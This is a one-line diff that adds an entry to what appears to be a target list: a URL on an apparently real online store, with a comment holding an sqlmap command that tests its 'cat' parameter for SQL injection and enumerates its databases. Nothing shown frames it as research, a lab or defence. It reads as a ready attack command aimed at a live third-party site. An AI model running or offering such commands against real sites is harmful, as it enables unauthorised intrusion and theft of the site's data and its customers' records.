@@ -1,0 +1,1 @@
+http://store.evtv.me/products.php?cat=22 (GET)  # sqlmap.py -u http://store.evtv.me/products.php?cat=22 --dbs
